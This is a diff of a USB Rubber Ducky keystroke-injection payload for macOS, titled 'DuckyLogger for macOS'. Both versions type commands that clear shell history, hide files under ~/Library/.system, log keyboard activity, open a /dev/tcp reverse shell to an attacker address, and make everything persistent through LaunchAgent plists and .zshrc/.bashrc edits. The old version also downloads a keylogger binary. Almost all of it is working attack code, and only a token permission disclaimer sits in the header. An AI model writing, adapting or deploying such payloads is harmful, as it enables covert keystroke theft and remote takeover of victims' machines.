@@ -1,113 +1,84 @@
-REM Title: macOS Payload for Keylogging and Reverse Shell (Fixed)
-REM Converted for macOS target by Grok, addressing zsh and launchctl errors
+REM Title: DuckyLogger for macOS
+REM Description: Key logger for macOS that sends keystrokes remotely/locally.
+REM AUTHOR: Adapted for macOS from drapl0n's original DuckyLogger
+REM Version: 1.0
+REM Category: Credentials
+REM Target: macOS
+REM Attackmodes: HID
+REM [Note]
+REM Adapted for macOS. Ensure you have permission to execute on your own device.
+REM Original: https://github.com/drapl0n/DuckyLogger/README.md
 
+REM [Delay to ensure system readiness]
 DELAY 5000
-REM Open Terminal.app on macOS
-GUI t
+
+REM [Open Terminal]
+GUI SPACE
+STRING TERMINAL
+ENTER
 DELAY 400
-REM Disable command history in zsh
-STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+
+REM [Clear command history to avoid traces]
+STRING unset HISTFILE && history -c
 ENTER
 DELAY 100
-REM Create a hidden directory for payload storage
+
+REM [Create hidden directory for payload]
 STRING mkdir -p ~/Library/.system
 ENTER
 DELAY 100
-REM Set up simple keylogging placeholder (macOS log stream)
-STRING echo "while true; do /usr/bin/log stream --type activity >> ~/Library/.system/keylog.txt 2>/dev/null; sleep 1; done" > ~/Library/.system/sys
+
+REM [Create keylogging mechanism using log stream]
+STRING echo "log stream --type activity --predicate 'eventMessage CONTAINS \"keyboard\"' >> ~/Library/.system/keylog.txt" > ~/Library/.system/sys.sh
 ENTER
 DELAY 100
-STRING chmod +x ~/Library/.system/sys
+STRING chmod +x ~/Library/.system/sys.sh
 ENTER
 DELAY 100
-REM Download a sample binary or script (placeholder, replace with valid macOS tool if needed)
-STRING cd ~/Library/.system/
+
+REM [Create reverse shell script]
+STRING echo -e "#!/bin/bash\nwhile true\ndo\n\tping -c 5 0.0.0.0\n\tif [ \$? -eq 0 ]; then\n\t\tbash -c 'exec 3<>/dev/tcp/0.0.0.0/4444; ~/Library/.system/sys.sh <&3 >&3 2>&3'\n\tfi\n\tsleep 5\ndone" > ~/Library/.system/systemBus.sh
 ENTER
 DELAY 100
-STRING curl -L -o keylogger https://github.com/drapl0n/DuckyLogger/raw/main/xinput || touch keylogger
-ENTER
-DELAY 5000
-STRING chmod +x keylogger || true
+STRING chmod +x ~/Library/.system/systemBus.sh
 ENTER
 DELAY 100
-REM Create reverse shell script
-STRING echo -e "while :\ndo\n\tping -c 5 192.168.4.1\n\tif [ \$? -eq 0 ]; then\n\t\tbash -c 'exec 3<>/dev/tcp/192.168.4.1/14420; ~/Library/.system/sys <&3 >&3 2>&3'\n\tfi\n\tsleep 5\ndone" > ~/Library/.system/systemBus
-ENTER
-DELAY 100
-STRING chmod +x ~/Library/.system/systemBus
-ENTER
-DELAY 100
-REM Create launchd plist for systemBus using cat heredoc
-STRING cat <<EOF > ~/Library/LaunchAgents/com.user.systembus.plist
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.systembus</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/bin/bash</string>
-        <string>$HOME/Library/.system/systemBus</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-</dict>
-</plist>
-EOF
+
+REM [Create launchd plist for persistence]
+STRING echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.systembus</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>~/Library/.system/systemBus.sh</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>" > ~/Library/LaunchAgents/com.user.systembus.plist
 ENTER
 DELAY 200
-REM Create reboot script
-STRING echo "while true; do launchctl bootstrap gui/\${UID} ~/Library/LaunchAgents/com.user.systembus.plist; sleep 900; done" > ~/Library/.system/reboot
+
+REM [Create reboot script to ensure persistence]
+STRING echo -e "#!/bin/bash\nwhile true; do launchctl load ~/Library/LaunchAgents/com.user.systembus.plist; sleep 900; done" > ~/Library/.system/reboot.sh
 ENTER
 DELAY 100
-STRING chmod +x ~/Library/.system/reboot
+STRING chmod +x ~/Library/.system/reboot.sh
 ENTER
 DELAY 100
-REM Create launchd plist for reboot using cat heredoc
-STRING cat <<EOF > ~/Library/LaunchAgents/com.user.reboot.plist
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.reboot</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/bin/bash</string>
-        <string>$HOME/Library/.system/reboot</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-</dict>
-</plist>
-EOF
+
+REM [Create launchd plist for reboot script]
+STRING echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.reboot</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>~/Library/.system/reboot.sh</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>" > ~/Library/LaunchAgents/com.user.reboot.plist
 ENTER
-DELAY 100
-REM Set permissions for LaunchAgents directory
-STRING chmod -R 755 ~/Library/LaunchAgents
-ENTER
-DELAY 100
-REM Load and start launchd services
-STRING launchctl bootstrap gui/\${UID} ~/Library/LaunchAgents/com.user.systembus.plist || true
+DELAY 200
+
+REM [Load and start launchd services]
+STRING launchctl load ~/Library/LaunchAgents/com.user.systembus.plist
 ENTER
 DELAY 150
-STRING launchctl kickstart gui/\${UID}/com.user.systembus || true
+STRING launchctl start com.user.systembus
 ENTER
 DELAY 150
-STRING launchctl bootstrap gui/\${UID} ~/Library/LaunchAgents/com.user.reboot.plist || true
+STRING launchctl load ~/Library/LaunchAgents/com.user.reboot.plist
 ENTER
 DELAY 150
-STRING launchctl kickstart gui/\${UID}/com.user.reboot || true
+STRING launchctl start com.user.reboot
 ENTER
 DELAY 100
-REM Add autostart to zshrc
-STRING echo -e "if [ -f ~/.zshrc ]; then\n\techo \"launchctl bootstrap gui/\${UID} ~/Library/LaunchAgents/com.user.systembus.plist && launchctl bootstrap gui/\${UID} ~/Library/LaunchAgents/com.user.reboot.plist\" >> ~/.zshrc\nfi" > ~/tmmmp
+
+REM [Add persistence to shell profile]
+STRING echo -e "if [ -f ~/.zshrc ]; then\n\techo 'launchctl load ~/Library/LaunchAgents/com.user.systembus.plist && launchctl load ~/Library/LaunchAgents/com.user.reboot.plist' >> ~/.zshrc\nfi\nif [ -f ~/.bashrc ]; then\n\techo 'launchctl load ~/Library/LaunchAgents/com.user.systembus.plist && launchctl load ~/Library/LaunchAgents/com.user.reboot.plist' >> ~/.bashrc\nfi" > ~/tmpscript.sh
 ENTER
 DELAY 100
-STRING chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
+STRING chmod +x ~/tmpscript.sh && ~/tmpscript.sh && rm ~/tmpscript.sh && exit
 ENTER
